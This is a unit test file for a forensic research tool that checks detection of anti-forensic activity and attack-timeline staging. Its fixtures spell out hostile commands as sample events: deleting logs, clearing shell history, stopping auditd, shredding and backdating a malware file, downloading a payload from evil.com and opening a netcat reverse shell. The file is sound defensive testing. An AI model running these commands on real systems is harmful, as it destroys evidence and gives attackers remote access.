"""
Unit Tests for CHRONOS-FL Research Engines (Timeline, Causality, Anti-Forensics, Trust).
"""

from chronos.research.detection_engine import AntiForensicsDetectionEngine
from chronos.research.timeline_engine import TimelineEngine
from chronos.research.causality_engine import CausalityEngine
from chronos.research.trust_engine import TrustAnalysisEngine
from chronos.shared.models import Event, EventType, AntiForensicCategory, EvidenceStatus


def test_anti_forensics_detection_engine():
    engine = AntiForensicsDetectionEngine()

    events = [
        Event(event_type=EventType.EXECVE.value, pid=201, comm="rm", cmdline="rm -rf /var/log/*", target_path="/var/log/syslog"),
        Event(event_type=EventType.EXECVE.value, pid=202, comm="bash", cmdline="history -c"),
        Event(event_type=EventType.EXECVE.value, pid=203, comm="systemctl", cmdline="systemctl stop auditd"),
        Event(event_type=EventType.EXECVE.value, pid=204, comm="shred", cmdline="shred -u /tmp/malware.py"),
        Event(event_type=EventType.EXECVE.value, pid=205, comm="touch", cmdline="touch -t 202001010000 /tmp/malware.py"),
        Event(event_type=EventType.EXECVE.value, pid=206, comm="date", cmdline="date --set='2020-01-01 00:00:00'"),
    ]

    alerts = engine.analyze_events(events)
    assert len(alerts) == 6

    categories = [a.category for a in alerts]
    assert AntiForensicCategory.LOG_DELETION.value in categories
    assert AntiForensicCategory.HISTORY_CLEARING.value in categories
    assert AntiForensicCategory.AUDIT_SHUTDOWN.value in categories


def test_timeline_engine():
    engine = TimelineEngine()
    events = [
        Event(event_type=EventType.EXECVE.value, pid=101, comm="sshd", cmdline="sshd: user [priv]"),
        Event(event_type=EventType.EXECVE.value, pid=102, comm="curl", cmdline="curl -O http://evil.com/payload.sh"),
        Event(event_type=EventType.CONNECT.value, pid=103, comm="nc", cmdline="nc -e /bin/bash 10.0.0.1 4444", target_ip="10.0.0.1", target_port=4444),
    ]

    items = engine.build_from_events(events)
    assert len(items) == 3
    assert items[0].stage == "User Login / Session"
    assert items[1].stage == "Download / File Ingress"
    assert items[2].stage == "Reverse Shell / C2"


def test_trust_analysis_engine():
    trust_engine = TrustAnalysisEngine()
    detector = AntiForensicsDetectionEngine()

    alerts = detector.analyze_events([
        Event(event_type=EventType.EXECVE.value, pid=99, comm="rm", cmdline="rm -rf /var/log/*")
    ])

    ess = trust_engine.compute_ess(alerts)
    tcs = trust_engine.compute_tcs(ess, alerts, ledger_valid=True)

    assert ess.ess_score < 100.0
    assert tcs.tcs_score < 100.0
